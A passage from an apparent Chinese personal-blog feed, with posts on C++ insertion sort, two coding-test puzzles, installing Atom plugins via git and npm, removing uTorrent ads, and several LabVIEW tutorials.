<h4 id="原理示意"><a href="#原理示意" class="headerlink" title="原理示意"></a>原理示意</h4><p><img src="/assets/algorithm/insertSort.gif" alt="insertSort"></p>
<h4 id="程序实现"><a href="#程序实现" class="headerlink" title="程序实现"></a>程序实现</h4><pre><code class="C++">void insertsort(int array[], int length)
{
  if (array == NULL || length &lt;= 0)
    return;

  int index, temp;
  for (int i = 1; i&lt;length; i++)
  {
    // 保存 array[i] 至中间变量
    temp = array[i];
    index = i;

    // 寻找插入位置, index = 1,2,...,i
    while (index&gt;0 &amp;&amp; temp&lt;array[index - 1])
    {
      array[index] = array[index - 1];
      index--;
    }

    // 插入数据
    array[index] = temp;
  }
}

// 使用实例
int main()
{
  int array[] = { 23,34,22,67,87,56,15,62,74,46 };
  int length = sizeof(array) / sizeof(int);
  insertsort(array, length);
  return 0;
}
</code></pre>
<h3 id="二分查找插入"><a href="#二分查找插入" class="headerlink" title="二分查找插入"></a>二分查找插入</h3><h4 id="二分思想"><a href="#二分思想" class="headerlink" title="二分思想"></a>二分思想</h4><p>二分查找插入是在直接插入的基础上进行优化，由于在插入前需要查找插入位置，而插入位置处于<strong>有序</strong>序列中，所以可以使用<strong>二分查找</strong>替代原先的逐个扫描，提高查找效率。</p>
<h4 id="二分实现"><a href="#二分实现" class="headerlink" title="二分实现"></a>二分实现</h4><pre><code class="C++">void binaryInsertsort(int array[], int length)
{
  if (array == NULL || length &lt;= 0)
    return;

  int index, temp, left, right, middle;
  for (int i = 1; i &lt; length; i++)
  {
    temp = array[i];      // 将本次待插入数据存入temp
    left = 0;
    right = i - 1;

    if (array[i] &gt;= array[0])
    {
      // 二分查找
      while (left&lt;=right)
      {
        middle = (left + right) / 2;
        if (temp &lt; array[middle])
          right = middle - 1;
        else
          left = middle + 1;
      }
    }

    // 移动数据，left即为查找到的插入位置
    for (int j = i - 1; j &gt;= left; j--)
      array[j + 1] = array[j];

    array[left] = temp;      // 插入temp到指定位置
  }
}
</code></pre>
]]></content>
      
        <categories>
            
            <category> 杂物柜 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[模拟试题2 - 二货小易的网格盒子]]></title>
      <url>https://www.litreily.top/2016/09/12/WYMN2/</url>
      <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>二货小易有一个W*H的网格盒子，网格的行编号为0~H-1，网格的列编号为0~W-1。每个格子至多可以放一块蛋糕，任意两块蛋糕的欧几里得距离不能等于2。</p>
<p>对于两个格子坐标(x1,y1), (x2,y2)的欧几里得距离为：((x1-x2)<em>(x1-x2)+(y1-y2)</em>(y1-y2))的算术平方根。</p>
<p>小易想知道最多可以放多少块蛋糕在网格盒子里。</p>
<h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><blockquote>
<p>每组数组包含网格长宽W,H，用空格分隔。(1&lt;=W、H&lt;=1000)</p>
</blockquote>
<h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><blockquote>
<p>输出一个最多可以放的蛋糕数</p>
</blockquote>
<h3 id="输入例子"><a href="#输入例子" class="headerlink" title="输入例子"></a>输入例子</h3><blockquote>
<p>3 2</p>
</blockquote>
<h3 id="输出例子"><a href="#输出例子" class="headerlink" title="输出例子"></a>输出例子</h3><blockquote>
<p>4</p>
</blockquote>
<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>根据题意，可以推测出蛋糕数最多的放置方案：将网格进行分区，每四个构成一个正方形的网格作为一个分区，类似于坐标变换。假设原坐标为(x,y),那么变换后的分区坐标为(x/2,y/2)。当变换后的分区坐标满足横纵坐标之和为偶数时，该分区内的4个网格均可放置蛋糕。</p>
<p><img src="/assets/algorithm/putCake.png" alt="putCake"></p>
<h2 id="解题程序"><a href="#解题程序" class="headerlink" title="解题程序"></a>解题程序</h2><pre><code class="C++">#include &lt;iostream&gt;
using namespace std;

int main()
{

  int W,H;
  int cnt=0; // 定义可放的蛋糕数
  cin&gt;&gt;W&gt;&gt;H; // 输入盒子网格的行列数

  for(int i = 0; i&lt;H; i++)
      for(int j = 0; j &lt; W; j++)
        if((i/2 + j/2) % 2 == 0)
          cnt++;
  cout&lt;&lt;cnt&lt;&lt;endl;
  return 0;
}
</code></pre>
]]></content>
      
        <categories>
            
            <category> 杂物柜 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[模拟试题1 - 计算PA+PB]]></title>
      <url>https://www.litreily.top/2016/09/12/WYMN1/</url>
      <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>正整数A的<strong>DA(1位整数)部分</strong>定义为由A中所有组成的新整数PA。例如：给定A=3862767，DA=6，则A的<strong>6部分</strong>PA是66，因为A中有2个6。</p>
<p>现给定A, DA, B, DB, 请编写程序计算PA+PB。</p>
<h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><blockquote>
<p>输入在一行中依次给出A，DA，B,DB，中间以空格分隔，其中 0 &lt; A, B &lt; 1e10</p>
</blockquote>
<h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><blockquote>
<p>在一行中输出PA+PB的值</p>
</blockquote>
<h3 id="输入例子"><a href="#输入例子" class="headerlink" title="输入例子"></a>输入例子</h3><blockquote>
<p>3862767 6 13530293 3</p>
</blockquote>
<h3 id="输出例子"><a href="#输出例子" class="headerlink" title="输出例子"></a>输出例子</h3><blockquote>
<p>399</p>
</blockquote>
<h2 id="解题程序"><a href="#解题程序" class="headerlink" title="解题程序"></a>解题程序</h2><pre><code class="C++">#include &lt;iostream&gt;
using namespace std;

void getPA(unsigned long num, int DA, unsigned long &amp; PA)
{
    PA = 0;
    while(num)           // 循环查找num中DA的个数
    {
      if(num%10==DA)
        PA = PA*10+DA;
      num/=10;
    }
}

int main()
{
    unsigned long A,B;
    unsigned long PA=0,PB=0;
    int DA,DB;

    cin&gt;&gt;A&gt;&gt;DA&gt;&gt;B&gt;&gt;DB;
    getPA(A,DA,PA);      // 计算PA
    getPA(B,DB,PB);      // 计算PB
    cout&lt;&lt;PA+PB&lt;&lt;endl;
    return 0;
}
</code></pre>
]]></content>
      
        <categories>
            
            <category> 杂物柜 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解决atom无法安装插件的问题]]></title>
      <url>https://www.litreily.top/2016/08/21/atom-packages/</url>
      <content type="html"><![CDATA[<h2 id="出错信息"><a href="#出错信息" class="headerlink" title="出错信息"></a>出错信息</h2><p>倘若使用<a href="https://atom.io/" target="_blank" rel="noopener">atom</a>自带的插件安装工具&quot;File-&gt;Settings-&gt;Install&quot;安装插件，通常会报错，以&quot;pp-markdown&quot;为例，其错误信息如下：</p>
<pre><code class="bash">  gyp info it worked if it ends with ok
  gyp info using node-gyp@2.0.2
  gyp info using node@0.10.40 | win32 | ia32
  gyp http GET http://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist/v0.37.8/node-v0.37.8.tar.gz
  gyp WARN install got an error, rolling back install
  gyp

  ! Compiler tools not found
  Packages that depend on modules that contain C/C++ code will fail to install.
  Read &lt;a href=&quot;http://flight-manual.atom.io/&quot;&gt;here&lt;/a&gt; for instructions on installing Python and Visual Studio.
  Run apm install --check after installing to test compiling a native module.
</code></pre>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><p>安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a>的目的在于使用npm工具，放弃apm工具。如果已经安装好，那么这一步自然可以略过。</p>
<h3 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h3><p>在atom的插件安装界面搜索所需的插件，点击插件名称将会从网页打开atom的插件库。</p>
<p><img src="/assets/atom/package.png" alt="atompackage"></p>
<p>此时我们点击<code>Repo</code>可以转至其github页面，复制插件的远程仓库目录。</p>
<p><img src="/assets/atom/package_git.png" alt="gitpackage"></p>
<p>在本地打开文件夹&quot;C:\Users\USER_NAME\.atom\packages&quot;，使用git指令将插件<code>clone</code>到该目录。</p>
<pre><code class="bash">git clone 插件的远程仓库目录
</code></pre>
<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>转至插件目录，使用<code>npm install</code>完成插件安装，重启atom即可。</p>
<pre><code class="bash">$ cd pp-markdown
$ npm install
marked@0.3.6 node_modules\marked

atom-space-pen-views@2.2.0 node_modules\atom-space-pen-views
├── fuzzaldrin@2.1.0
└── space-pen@5.1.2 (underscore-plus@1.6.6, jquery@2.1.4, grim@1.5.0)
</code></pre>
<h3 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h3><p><img src="/assets/atom/pp-markdown.png" alt="pp-markdown"></p>
<p>该方案看似有点繁琐，却也能够达到目的，毕竟我们需要安装的插件并不会太多，它日有更好的方法再用不迟。</p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> atom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[消除utorrent中的广告]]></title>
      <url>https://www.litreily.top/2016/08/17/clearAD/</url>
      <content type="html"><![CDATA[<p>其实，网上已有大把的教程教我如何去广告，但每次都要谷歌百度却也烦不胜烦，这也就只好搬运到这咯，一劳永逸。</p>
<h2 id="去广告前"><a href="#去广告前" class="headerlink" title="去广告前"></a>去广告前</h2><p><img src="/assets/utorrent/haveAD.png" alt="haveAD"></p>
<h2 id="去广告"><a href="#去广告" class="headerlink" title="去广告"></a>去广告</h2><ol>
<li>在utorrent的菜单栏中选择&quot;选项&quot;，打开“设置”界面，或者按快捷键<code>ctrl+p</code>;</li>
<li>在设置界面中选择最后一项&quot;高级&quot;;</li>
<li>在过滤中输入&quot;offers.&quot;，将以下两项设为false：<ul>
<li>&quot;offers.sponsored_torrent_offer_enabled&quot; ,</li>
<li>&quot;offers.left_rail_offer_enabled&quot;</li>
</ul>
</li>
<li>在过滤中输入&quot;gui.&quot;,将&quot;gui.show_notorrents_node&quot;设为false.</li>
</ol>
<p><img src="/assets/utorrent/settingPanel.png" alt="haveAD"></p>
<h2 id="去广告后"><a href="#去广告后" class="headerlink" title="去广告后"></a>去广告后</h2><p><img src="/assets/utorrent/noAD.png" alt="haveAD"></p>
<p>好了，至此广告一扫全无，enjoy it！</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tools </tag>
            
            <tag> utorrent </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - 存储txt文件]]></title>
      <url>https://www.litreily.top/2016/06/10/labview-rwTxt/</url>
      <content type="html"><![CDATA[<h2 id="存储文件"><a href="#存储文件" class="headerlink" title="存储文件"></a>存储文件</h2><h3 id="简单存储"><a href="#简单存储" class="headerlink" title="简单存储"></a>简单存储</h3><p>写个简单的小程序，用于存储四列随机数，每隔1s存储一次，数据之间以tab作为分隔符。</p>
<p><img src="/assets/labview/rwTxt/readTxt.png" alt="readTxt"></p>
<p>存储后的文件:</p>
<p><img src="/assets/labview/rwTxt/testTxt.png" alt="testTxt"></p>
<h3 id="加入表头"><a href="#加入表头" class="headerlink" title="加入表头"></a>加入表头</h3><p>看着上面这个文件，总感觉少点什么，对了，表头还没加。那就加个判断，首次创建文件时添个表头。为了简化点，定时结构就不截图了。</p>
<p><img src="/assets/labview/rwTxt/addTitle.png" alt="addTitle"></p>
<p>现在再来看看这个txt文件，表头已经被加上了，虽然看着没怎么对齐，但这是正常的，如果导入至Excel就可以看出来。</p>
<p><img src="/assets/labview/rwTxt/testTitle.png" alt="testTitle"></p>
<h3 id="存储时间"><a href="#存储时间" class="headerlink" title="存储时间"></a>存储时间</h3><p>大部分情况下，我们在存储数据的同时需要记录存储时间，那么就再稍稍修改一下程序。</p>
<p><img src="/assets/labview/rwTxt/addTime.png" alt="addTime"></p>
<p>添加的东西也不多，就是多了个表头，每组数据前多了个时间标识，需要说明一点的是，这里用到的&quot;格式化日期/时间字符串&quot;，它的格式化方法可以参考以下说明。</p>
<p><img src="/assets/labview/rwTxt/timeStrHelp.png" alt="timeStrHelp"></p>
<blockquote>
<p>下列代码为部分常用的时间格式代码：%c可显示依据地域语言设定的日期/时间。<br><strong>时间</strong>相关格式代码为：%X（指定地域的时间），%H（小时，24小时），%I（小时，12小时），%M（分钟），%S（秒），%u（分数秒），%p（a.m./p.m.标识）。<br><strong>日期</strong>相关格式代码为：%x（指定地域日期），%y（两位年份），%Y（四位年份），%m（月份），%b（月名缩写），%d（一个月中的天值），%a（星期名缩写）。</p>
</blockquote>
<p>好了，改好了就测试一下，看看时间已经被加上了。</p>
<p><img src="/assets/labview/rwTxt/testTime.png" alt="testTime"></p>
<h3 id="有趣实例"><a href="#有趣实例" class="headerlink" title="有趣实例"></a>有趣实例</h3><p>好了，现在来写个有趣的小程序，定时存储一组数据至txt文件，包含人的姓名、性别、年龄、身高和名族。具体要求如下表所示。</p>
<table>
<thead>
<tr>
<th></th>
<th>姓名</th>
<th>性别</th>
<th>年龄</th>
<th>身高(m)</th>
<th>汉族</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据类型</td>
<td>字符串</td>
<td>字符串</td>
<td>Byte</td>
<td>Double</td>
<td>布尔</td>
</tr>
<tr>
<td>要求</td>
<td>随机</td>
<td>男/女</td>
<td>12~40</td>
<td>1.40~1.80</td>
<td>T/F</td>
</tr>
</tbody>
</table>
<p>程序框图如下：</p>
<p><img src="/assets/labview/rwTxt/randomWrite.png" alt="randomWrite"></p>
<p>好了，现在运行程序，看看会有哪些有趣的名字呢。</p>
<p><img src="/assets/labview/rwTxt/randomTxt.png" alt="randomTxt"></p>
<p>关于.txt文件存储就讲这些吧。以后若是有其它运用方式，遇到了再写不迟。</p>
<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p>文中提到的两个vi文件已共享至百度网盘，以供<a href="http://pan.baidu.com/s/1kU7mveZ" target="_blank" rel="noopener">下载</a>。</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - 常用快捷键]]></title>
      <url>https://www.litreily.top/2016/06/06/shrotcuts/</url>
      <content type="html"><![CDATA[<p>作为一款功能强大的编程软件，自然少不了大量的快捷键支持。在开发过程中，熟练使用这些快捷键，可以高效完成编码调试过程，减少手动操作，提高工作效率。</p>
<h2 id="菜单快捷键"><a href="#菜单快捷键" class="headerlink" title="菜单快捷键"></a>菜单快捷键</h2><p>打开LabVIEW中的&quot;选项&quot;界面，在&quot;菜单快捷键&quot;中可以看到所有可用的快捷键。当然，如果觉得不够用或是与其它软件有冲突，可以手动添加或修改新的快捷键。</p>
<p><img src="/assets/labview/shortcuts/editPanel.png" alt="Labview editPanel"></p>
<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>快捷键虽多，但常用的却有限。我简单将其分为通用键、功能键和技巧键。</p>
<h3 id="通用键"><a href="#通用键" class="headerlink" title="通用键"></a>通用键</h3><p>有些快捷键是大部分软件共有的，其功能也类似。</p>
<ul>
<li>Ctrl+N：新建</li>
<li>Ctrl+A：全选</li>
<li>Ctrl+C：复制</li>
<li>Ctrl+V：粘贴</li>
<li>Ctrl+S：保存</li>
<li>Ctrl+Shift+S：保存全部</li>
</ul>
<h3 id="功能键"><a href="#功能键" class="headerlink" title="功能键"></a>功能键</h3><p>在代码编辑过程中经常会用到的功能性快捷键包括：</p>
<ul>
<li>Ctrl+R：运行程序</li>
<li>Ctrl+E：在前面板和程序框图之间切换</li>
<li>Ctrl+H：打开/关闭即时帮助</li>
<li>Ctrl+B：删除断线</li>
<li>Ctrl+I：查看当前VI属性</li>
<li>Ctrl+T：左右两栏显示前面板和程序框图</li>
<li>Ctrl+W：关闭当前界面或项目</li>
<li>Ctrl+Q：退出LabVIEW</li>
</ul>
<h3 id="技巧键"><a href="#技巧键" class="headerlink" title="技巧键"></a>技巧键</h3><ul>
<li>Ctrl+鼠标拖动：复制被选控件或函数</li>
<li>Ctrl+鼠标滚轮：切换多层结构的当前结构帧</li>
<li>Shift+控件：将鼠标改为选择指针，用于选中某个或多个控件</li>
<li>双击鼠标左键：添加注释</li>
<li>Ctrl+Shift+鼠标拖动：将鼠标改为手形指针，用于拖动程序框图</li>
</ul>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>如果一个函数仅包含两个输入接口时，例如：加、减、乘、除。当我们要切换两个输入接口的连线时，例如减法的两个输入A和B，开始连接的时候是A-B，现在发现不对，要改成B-A。默认我们会去删除两条线然后重新连接，但使用快捷键<code>Ctrl+Click</code>可以直接完成切换。<br><img src="/assets/labview/shortcuts/exchange.gif" alt="Labview exchange"></p>
<p><strong>使用方法：</strong>在点击Ctrl后移动鼠标至函数的任一输入端，鼠标指针会变为类似数字8的一个图标，此时点击鼠标左键即可完成切换。</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - 对话框程序模板]]></title>
      <url>https://www.litreily.top/2016/06/06/labview-dialog/</url>
      <content type="html"><![CDATA[<p>软件开发过程中，经常要使用对话框界面，例如各种参数设置界面等。为了减少重复性工作，我们可以创建一个对话框模板，往后就可以通过该模板直接新建对话框界面。</p>
<h2 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h2><h3 id="新建vi"><a href="#新建vi" class="headerlink" title="新建vi"></a>新建vi</h3><p>打开LabVIEW软件，新建vi，保存为&quot;对话框模板.vi&quot;。</p>
<p><img src="/assets/labview/dialog/template.png" alt="Labview template.vi"></p>
<h3 id="添加while循环"><a href="#添加while循环" class="headerlink" title="添加while循环"></a>添加while循环</h3><p>对话框界面也属于用户界面，所以需要给它单独开辟一个线程，即一个while循环。</p>
<p><img src="/assets/labview/dialog/while.png" alt="Labview while"></p>
<h3 id="添加移位寄存器"><a href="#添加移位寄存器" class="headerlink" title="添加移位寄存器"></a>添加移位寄存器</h3><p>在while循环左上角添加一个移位寄存器，然后创建一个<strong>枚举常量</strong>，给其添加以下内容：</p>
<ul>
<li>init：初始化</li>
<li>run：运行</li>
<li>exit：退出</li>
</ul>
<p>编辑完成后点击确定，然后将其连接至移位寄存器的输入端，默认设为&quot;init&quot;。</p>
<p><img src="/assets/labview/dialog/enum.png" alt="Labview enum"></p>
<h3 id="添加条件结构"><a href="#添加条件结构" class="headerlink" title="添加条件结构"></a>添加条件结构</h3><p>在while循环中添加一个条件结构，将将移位寄存器的值作为判断条件。为条件结构的每个值添加分支。</p>
<p><img src="/assets/labview/dialog/switch.png" alt="Labview switch"></p>
<h3 id="添加事件结构"><a href="#添加事件结构" class="headerlink" title="添加事件结构"></a>添加事件结构</h3><p>在条件结构的&quot;run&quot;分支中添加事件结构，用于响应用户操作。至此，所需的三个主要控制结构就都有了。</p>
<p><img src="/assets/labview/dialog/event.png" alt="Labview event"></p>
<h3 id="修改init分支"><a href="#修改init分支" class="headerlink" title="修改init分支"></a>修改init分支</h3><p>在条件结构的&quot;init&quot;（初始化）分支中，用户可以添加对话框的<strong>初始化</strong>程序。该分支只执行一次，接着进入&quot;run&quot;（主程序运行）分支，所以需要将移位寄存器的值设为&quot;run&quot;。</p>
<p><img src="/assets/labview/dialog/init.png" alt="Labview init"></p>
<h3 id="添加前面板关闭事件"><a href="#添加前面板关闭事件" class="headerlink" title="添加前面板关闭事件"></a>添加前面板关闭事件</h3><p>给事件结构添加&quot;前面板关闭？&quot;事件分支，然后将&quot;放弃？&quot;设为真，不让前面板在此刻关闭。同时将移位寄存器的值设为&quot;exit&quot;。</p>
<p><img src="/assets/labview/dialog/closeFront.png" alt="Labview closeFront"></p>
<p><img src="/assets/labview/dialog/exit.png" alt="Labview exit"></p>
<h3 id="添加循环停止条件"><a href="#添加循环停止条件" class="headerlink" title="添加循环停止条件"></a>添加循环停止条件</h3><p>所有的while循环都需要一个停止条件，这里的while循环同样也需要，其停止条件便是移位寄存器的值变为&quot;exit&quot;。</p>
<p><img src="/assets/labview/dialog/exitRule.png" alt="Labview exitRule"></p>
<h3 id="完善移位寄存器"><a href="#完善移位寄存器" class="headerlink" title="完善移位寄存器"></a>完善移位寄存器</h3><p>现在看看程序，是不是还无法执行，因为移位寄存器的部分连线没有赋值，现在简要演示一下完善过程。</p>
<p><img src="/assets/labview/dialog/register.gif" alt="Labview register"></p>
<h3 id="添加界面关闭程序"><a href="#添加界面关闭程序" class="headerlink" title="添加界面关闭程序"></a>添加界面关闭程序</h3><p>从上面可以看出，在关闭前面板时，我们选择了放弃，然后进入&quot;exit&quot;分支，就是为了在这个分支中处理界面关闭前的任务，例如存储数据，保存界面参数等操作。不过这样一来，我们就需要在while循环结束时关闭界面，此处可以使用属性节点。</p>
<p><img src="/assets/labview/dialog/exitPanel.png" alt="Labview exitPanel"></p>
<h2 id="设置vi属性"><a href="#设置vi属性" class="headerlink" title="设置vi属性"></a>设置vi属性</h2><p>以上操作完成了对话框界面的程序框图设计，但此时运行该对话框，它还包含了系统自带的菜单栏和工具栏，而这些都是对话框不需要的。</p>
<p><img src="/assets/labview/dialog/dialog_1.png" alt="Labview dialog"></p>
<p>此时，我们可以通过快捷键<code>Ctrl+I</code>打开<strong>VI属性</strong>界面，在类别中选择<strong>窗口外观</strong>，最后选择<strong>对话框</strong>，点击确定。</p>
<p><img src="/assets/labview/dialog/dialog_view.png" alt="Labview VI Properties"></p>
<p>到此为止，一个简单的对话框界面模板就完成了，往后使用时，就可以通过&quot;复制该模板&rarr;重命名vi文件&rarr;添砖加瓦&quot;得到新的对话框。</p>
<p><img src="/assets/labview/dialog/dialog_2.png" alt="Labview dialog"></p>
<p>该模板比较简单，但是非常实用，大多数设置界面都可以使用该模板进行设计。当然也可以进一步完善。例如，很多设置界面都有<strong>应用</strong>按钮和<strong>退出</strong>按钮，那么，我们可以在模板中添加一个应用按钮和一个退出按钮，并添加对应的按钮点击事件，修改移位寄存器的值。</p>
<h2 id="下载模板"><a href="#下载模板" class="headerlink" title="下载模板"></a>下载模板</h2><p>我将模板存至网盘便于下载：<a href="http://pan.baidu.com/s/1pKUe7Ib" target="_blank" rel="noopener">下载链接</a>。</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - 基本概念]]></title>
      <url>https://www.litreily.top/2016/06/05/labview-base/</url>
      <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>《百度百科》词条&quot;LabVIEW&quot;中提到：</p>
<blockquote>
<p><strong>LabVIEW</strong>（Laboratory Virtual Instrument Engineering Workbench）由美国国家仪器（NI）公司研制开发，是一种用图标代替文本行创建应用程序的图形化编程语言，它广泛地被工业界、学术界和研究实验室所接受，视为一个标准的数据采集和仪器控制软件。与<strong>C</strong>和<strong>BASIC</strong>一样，LabVIEW也是通用的编程系统，有一个完成任何编程任务的庞大函数库。采用数据流编程方式，程序框图中节点之间的数据流向决定了VI及函数的执行顺序。</p>
</blockquote>
<p><img src="/assets/labview/keyWords/Labview.png" alt="Labview"></p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在使用LabVIEW进行软件开发的过程中，少不了提及一些专有名词和概念，这里对常用的几个概念进行简要说明。</p>
<h3 id="VI"><a href="#VI" class="headerlink" title="VI"></a>VI</h3><p><strong>VI</strong> 是categories: LabVIEW（Virtual Instrument）的简称，其对应的 <strong>.vi</strong> 文件是LabVIEW软件开发过程中用到的基本单元，类似于 <strong>C/C</strong> 语言开发的 <strong>.c/.cpp</strong> 文件。无论是用于显示的用户界面，还是不用于显示的函数，都是以 <strong>.vi</strong> 文件形式存在。</p>
<h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>相对于独立的vi文件，LabVIEW<strong>项目</strong>则是一个大的容器，它可以包含一个或多个 <strong>.vi</strong> 文件，以及其它类型的依赖文件，如 <strong>.dll</strong> 链接库文件<strong>.rhm</strong> 菜单文件<strong>.lvproj</strong> 工程文件<strong>.lib</strong> 函数库文件<strong>.ctl</strong> 自定义控件文件等。当然，一个项目还可以包含<strong>.txt</strong> 等数据文件。独立的 <strong>vi</strong> 可以单独执行，但如果需要打包成 <strong>.exe</strong> 可执行文件或 <strong>.setup</strong> 安装包文件，就必须创建<strong>项目</strong>文件，通过 &quot;程序设计规范&quot; 对项目文件进行打包处理。</p>
<p><img src="/assets/labview/keyWords/project.png" alt="Labview project"></p>
<h3 id="前面板"><a href="#前面板" class="headerlink" title="前面板"></a>前面板</h3><p>在LabVIEW开发环境中，vi程序分<strong>前面板</strong>和<strong>程序框图</strong>两部分。其中<strong>前面板</strong>用于设计用户界面，可以放置各种程序控件，是软件用户能够看见的交互界面。如果作为函数vi，其<strong>前面板</strong>还可以设置函数接口。软件完成并生成可执行文件后，软件用户界面显示的就是该界面所对应vi程序的<strong>前面板</strong>，而其它仅实现某种函数功能而无需显示的vi程序，其<strong>前面板</strong>将不会在调用过程中显示。</p>
<p><img src="/assets/labview/keyWords/frontPanel.png" alt="Labview frontPanel"></p>
<h3 id="程序框图"><a href="#程序框图" class="headerlink" title="程序框图"></a>程序框图</h3><p><strong>程序框图</strong>作为vi程序的另一部分，用于实现软件功能。从前面板获取用户数据，在<strong>程序框图</strong>中进行逻辑运算，并将运算结果返回前面板或存储至本地文件。在框图中，开发人员可以通过各种控制结构（顺序、循环、条件、事件、定时等）控制程序的执行顺序，通过调用LabVIEW内置函数库中的大量函数实现软件功能。</p>
<p><img src="/assets/labview/keyWords/flowChart.png" alt="Labview flowChart"></p>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>与其它编程语言一样，LabVIEW也有<strong>局部变量</strong>和<strong>全局变量</strong>局部变量**作用域为本vi程序，只能在本vi中调用。本vi启动时，系统为其分配内存空间；当本vi结束运行后，系统释放其内存。</p>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>对于一个多vi的项目而言，如果某个或某些变量需要被两个或多个vi调用时，可以考虑使用<strong>全局变量</strong>。该变量作用域为项目中的所有vi程序，软件启动时，系统为其分配内存空间；软件关闭后，系统释放其内存。</p>
<p>根据我的编程经验，可以依据以下几种情况考虑是否使用全局变量：</p>
<ul>
<li>某变量仅被一个vi调用，无需设定全局变量；</li>
<li>某变量仅被两个vi调用，而且不会频繁更新，可以通过函数接口传递参数，无需设定全局变量；</li>
<li>某变量被3个或3个以上vi调用，且vi之间没有函数接口，可以考虑使用全局变量；</li>
<li>某变量被两个或两个以上的<strong>用户界面</strong>调用，多个界面可能并行执行，必须使用全局变量。</li>
</ul>
<p><strong>注意</strong>：全局变量也是以vi形式存在，但是它只有前面板，没有程序框图。此外，多个全局变量可以放置在同一个vi中，我们也推荐这么做，这样可以减少全局vi的个数。如果项目文件较小，全局变量个数较少，完全可以只用一个vi文件存储所有的全局变量；如果项目比较庞大，所需的全局变量较多，可以适当增加全局vi文件个数，但也应该将全局变量归类，相同或相似功能的变量应放在一个vi中。</p>
<h3 id="属性节点"><a href="#属性节点" class="headerlink" title="属性节点"></a>属性节点</h3><p>学习LabVIEW软件开发<strong>属性节点</strong>也是必须掌握的一个内容。这个词可以分为&quot;属性&quot;和&quot;节点&quot;两部分，对应前面板的所有控件，即使是修饰性控件也有其属性。以数值输入控件为例，其属性配置界面如下图所示：</p>
<p><img src="/assets/labview/keyWords/properties.png" alt="Labview properties"></p>
<p>开发人员可以在属性配置界面配置控件的默认属性，该操作适用于无需再次更改的属性。每个控件都有其可修改的属性列表，开发人员可以选择控件本身或其接线端，通过 &quot;右键&rarr;创建&rarr;属性节点&rarr;属性&quot; 创建或查看该控件的属性项。</p>
<p><img src="/assets/labview/keyWords/node.png" alt="Labview node"></p>
<p>除属性节点外，LabVIEW中还有大量的&quot;节点&quot;，如&quot;表达式节点&quot;公式节点&quot;反馈节点&quot;调用节点&quot;等。对&quot;属性节点&quot;而言，可以举个简单的例子，以人为例，每个人都可以看做一个节点，人包含&quot;姓名&quot;身高&quot;体重&quot;性别&quot;年龄&quot;等属性，那么属性节点就可以理解为包含多个属性的人。读写&quot;属性节点&quot;就是对该节点的某项属性进行读写操作。</p>
<h3 id="接线端"><a href="#接线端" class="headerlink" title="接线端"></a>接线端</h3><p>对于前面板上的一个控件而言，它在前面板仅出现一次，但在程序框图中可以多种方式出现，包括<strong>接线端</strong>引用<strong>局部变量</strong>和<strong>属性节点</strong>，但每个控件的<strong>接线端</strong>有且只有一个，其它方式则可以多次出现或不出现<strong>接线端</strong>与我们所说的采集卡的接线端是一个道理，它是程序框图与前面板之间传递参数的桥梁。当我们删除前面板中的某个控件时，其程序框图中的接线端也会随之删除，反之亦然。</p>
<p><img src="/assets/labview/keyWords/port.png" alt="Labview port"></p>
